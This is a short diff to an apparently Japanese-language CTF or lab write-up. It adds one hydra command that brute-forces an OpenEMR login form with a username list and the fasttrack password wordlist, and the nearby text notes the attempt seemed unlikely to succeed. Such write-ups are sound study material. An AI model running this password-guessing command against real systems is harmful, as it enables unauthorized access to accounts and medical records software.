@@ -169,8 +169,7 @@ Finished
 
 - 並行して入手済みユーザー名小文字と簡単なパスワードでブルートフォースはできなさそう。
 ```sh
-
-
+hydra -L possible_usernames.txt -P /usr/share/wordlists/fasttrack.txt $TargetIP http-post-form "/openemr/interface/main/main_screen.php?auth=login&site=default:new_login_session_management=1&authProvider=Default&authUser=^USER^&clearPass=^PASS^&languageChoice=1:S=302" 
 ```
 
 ## source -> nothing
